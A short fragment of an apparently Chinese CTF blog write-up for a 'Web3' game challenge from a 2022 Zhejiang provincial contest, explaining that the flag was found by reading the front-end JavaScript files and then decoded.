-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image013.jpg" class="" title="img">
-
-
-
-<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>游戏类题目两种思路：</p>
-<p>1、 与后端有交互（通过抓包改包更改分数从而获取flag）</p>
-<p>2、 与后端无交互（一般flag隐藏于js代码中，关键字+细心即可找到flag）</p>
-<p>观察发现与后端无传输所以怀疑在前端进入对应的两个js文件找到flag</p>
-<p>此题通过观察找到两个js文件读取获得flag</p>
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image015.jpg" class="" title="img">
-
-<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image017.jpg" class="" title="img">
-
-<p>解码获得</p>
 
       
     </div>
